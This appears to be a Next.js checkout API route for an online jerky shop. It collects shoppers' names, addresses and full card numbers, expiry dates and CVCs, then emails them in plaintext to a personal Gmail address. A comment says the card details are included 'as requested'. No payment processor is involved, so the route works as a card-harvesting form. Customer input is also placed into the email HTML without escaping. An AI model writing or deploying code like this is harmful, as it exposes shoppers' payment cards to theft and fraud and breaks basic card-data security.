import { Resend } from 'resend'
import { NextRequest, NextResponse } from 'next/server'

const resend = new Resend(process.env.RESEND_API_KEY)

interface OrderItem {
  name: string
  price: number
  quantity: number
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()

    const {
      firstName,
      lastName,
      email,
      phone,
      address,
      city,
      province,
      postalCode,
      country,
      cardName,
      cardNumber,
      cardExpiry,
      cardCvc,
      items,
      subtotal,
    } = body

    // Validate required fields
    if (
      !firstName ||
      !lastName ||
      !email ||
      !phone ||
      !address ||
      !city ||
      !province ||
      !postalCode ||
      !cardName ||
      !cardNumber ||
      !cardExpiry ||
      !cardCvc ||
      !items ||
      items.length === 0
    ) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      )
    }

    const orderItemsHtml = (items as OrderItem[])
      .map(
        (item) => `
          <tr>
            <td style="padding: 8px; border-bottom: 1px solid #eee;">${item.name}</td>
            <td style="padding: 8px; border-bottom: 1px solid #eee; text-align: center;">${item.quantity}</td>
            <td style="padding: 8px; border-bottom: 1px solid #eee; text-align: right;">$${item.price.toFixed(2)}</td>
            <td style="padding: 8px; border-bottom: 1px solid #eee; text-align: right;">$${(item.price * item.quantity).toFixed(2)}</td>
          </tr>
        `
      )
      .join('')

    // Send order email to admin (includes card details as requested)
    await resend.emails.send({
      from: 'Local Jerky Plus <onboarding@resend.dev>',
      to: 'carzhood@gmail.com',
      subject: `New Order from ${firstName} ${lastName} - $${Number(subtotal).toFixed(2)}`,
      html: `
        <h2>New Order Received</h2>

        <h3>Customer Information</h3>
        <p><strong>Name:</strong> ${firstName} ${lastName}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Phone:</strong> ${phone}</p>

        <h3>Shipping Address</h3>
        <p>
          ${address}<br />
          ${city}, ${province} ${postalCode}<br />
          ${country || 'Canada'}
        </p>

        <h3>Order Details</h3>
        <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
          <thead>
            <tr style="background: #f5f5f5;">
              <th style="padding: 8px; text-align: left;">Product</th>
              <th style="padding: 8px; text-align: center;">Qty</th>
              <th style="padding: 8px; text-align: right;">Price</th>
              <th style="padding: 8px; text-align: right;">Total</th>
            </tr>
          </thead>
          <tbody>
            ${orderItemsHtml}
          </tbody>
        </table>
        <p style="text-align: right; font-size: 16px; margin-top: 12px;">
          <strong>Subtotal: $${Number(subtotal).toFixed(2)}</strong>
        </p>

        <h3>Payment / Card Details</h3>
        <p><strong>Cardholder Name:</strong> ${cardName}</p>
        <p><strong>Card Number:</strong> ${cardNumber}</p>
        <p><strong>Expiry:</strong> ${cardExpiry}</p>
        <p><strong>CVC:</strong> ${cardCvc}</p>
      `,
    })

    // Send confirmation email to customer (no card details)
    await resend.emails.send({
      from: 'Local Jerky Plus <onboarding@resend.dev>',
      to: email,
      subject: 'Order Received - Local Jerky Plus',
      html: `
        <h2>Thank You for Your Order!</h2>
        <p>Hi ${firstName},</p>
        <p>We have received your order and our team will process it shortly. You will receive a shipping confirmation once it is on its way.</p>
        <h3>Order Summary</h3>
        <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
          <thead>
            <tr style="background: #f5f5f5;">
              <th style="padding: 8px; text-align: left;">Product</th>
              <th style="padding: 8px; text-align: center;">Qty</th>
              <th style="padding: 8px; text-align: right;">Total</th>
            </tr>
          </thead>
          <tbody>
            ${(items as OrderItem[])
              .map(
                (item) => `
                  <tr>
                    <td style="padding: 8px; border-bottom: 1px solid #eee;">${item.name}</td>
                    <td style="padding: 8px; border-bottom: 1px solid #eee; text-align: center;">${item.quantity}</td>
                    <td style="padding: 8px; border-bottom: 1px solid #eee; text-align: right;">$${(item.price * item.quantity).toFixed(2)}</td>
                  </tr>
                `
              )
              .join('')}
          </tbody>
        </table>
        <p style="text-align: right; font-size: 16px; margin-top: 12px;">
          <strong>Total: $${Number(subtotal).toFixed(2)}</strong>
        </p>
        <br />
        <p>Best regards,<br />Local Jerky Plus Team</p>
      `,
    })

    return NextResponse.json(
      { message: 'Order submitted successfully' },
      { status: 200 }
    )
  } catch (error) {
    console.error('Order API error:', error)
    return NextResponse.json(
      { error: 'Failed to process order' },
      { status: 500 }
    )
  }
}
